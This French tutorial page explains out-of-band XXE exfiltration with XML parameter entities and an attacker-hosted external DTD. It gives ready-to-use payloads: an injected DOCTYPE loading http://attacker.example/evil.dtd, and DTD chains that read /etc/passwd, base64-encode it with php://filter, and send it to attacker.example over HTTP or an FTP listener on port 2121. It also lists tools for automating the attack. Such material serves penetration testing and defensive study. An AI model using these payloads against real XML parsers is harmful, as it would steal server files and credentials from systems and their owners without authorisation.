---
title: "Exfiltration XXE hors bande avec des entités paramètres"
description: "Quand rien n'est reflété, les entités paramètres et une DTD externe exfiltrent le contenu du fichier vers un serveur de l'attaquant via HTTP ou FTP."
keywords:
  - XXE hors bande
  - entité paramètre
  - DTD externe
  - exfiltration OOB
  - récupération de données aveugle
---

# Hors bande

Quand l'application parse le XML mais ne reflète jamais aucune valeur parsée, la lecture en bande échoue : le fichier est récupéré mais son contenu ne va nulle part de visible. Le XXE hors bande (OOB) récupère quand même les données en faisant envoyer au parseur le fichier vers un serveur que l'attaquant contrôle, via HTTP ou FTP, dans le cadre de l'URL qu'il requête.

## Pourquoi des entités paramètres

Une référence d'entité générale comme `&xxe;` ne peut pas apparaître dans la valeur déclarée d'une autre entité dans le sous-ensemble interne, et la plupart des parseurs rejettent les tentatives d'imbriquer des entités générales là. Les **entités paramètres** (`%name;`) sont le mécanisme conçu pour être utilisé à l'intérieur des DTD, et elles sont le moyen fiable de construire la chaîne d'exfiltration. Le motif portable garde presque tout dans une **DTD externe** que l'attaquant héberge, parce que de nombreux parseurs interdisent une référence d'entité paramètre à l'intérieur d'une déclaration de balisage dans le sous-ensemble interne mais l'autorisent dans un externe.

Le document injecté reste petit. Il déclare une entité paramètre pointant vers la DTD de l'attaquant puis l'invoque :

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.example/evil.dtd">
  %xxe;
]>
<foo>bar</foo>
```

## La DTD externe

`evil.dtd`, servie depuis l'hôte de l'attaquant, lit le fichier cible dans une entité paramètre, puis construit une seconde entité dont la valeur est une URL de l'attaquant avec le contenu du fichier intégré dans le chemin. Une troisième entité déclenche la requête :

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example/log?x=%file;'>">
%eval;
%exfil;
```

La séquence est délibérée. `%file;` capture le fichier. `%eval;` est une déclaration imbriquée dont le corps, une fois `%file;` étendue, définit `%exfil;` comme une requête vers le collecteur avec les données ajoutées. `&#x25;` est la référence numérique pour `%`, nécessaire parce qu'un `%` littéral à l'intérieur d'une valeur d'entité serait autrement parsé comme une référence d'entité paramètre pendant la déclaration plutôt qu'au moment voulu. Enfin `%exfil;` force le parseur à résoudre l'URL SYSTEM, et l'attaquant lit le contenu du fichier dans le journal de la requête entrante.

Encoder le fichier en base64 avec `php://filter` est important pour l'OOB : les sauts de ligne bruts et les caractères d'URL réservés corrompraient ou tronqueraient la chaîne de requête, et certains octets sont illégaux dans les valeurs d'entité XML. L'encodage produit une chaîne compacte et sûre pour les URL.

## FTP pour des données plus volumineuses ou délicates

Les chaînes de requête HTTP sont limitées en longueur et s'arrêtent au premier saut de ligne dans de nombreux parseurs. Un listener FTP géré par l'attaquant évite les deux problèmes et capture souvent du contenu multi-lignes que l'exfiltration HTTP tronque :

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.example:2121/%file;'>">
%eval;
%exfil;
```

Le parseur ouvre une connexion FTP vers l'hôte de l'attaquant et place le contenu du fichier dans le chemin requêté, ce qu'un simple listener enregistre. FTP contourne aussi certains filtrages d'egress HTTP sortant. Quand tout le réseau sortant est bloqué, passez plutôt à une technique basée sur les erreurs ou en DTD locale.

## Outils

- **XXEinjector** : automatisation de l'exfiltration hors bande avec une DTD hébergée et un listener FTP.
- **Burp Collaborator** : capture des rappels HTTP et DNS hors bande.
- Tests manuels avec une DTD externe hébergée et un listener FTP pour les données plus volumineuses.

## Références

- [OWASP: XML External Entity (XXE) Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [PayloadsAllTheThings: XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
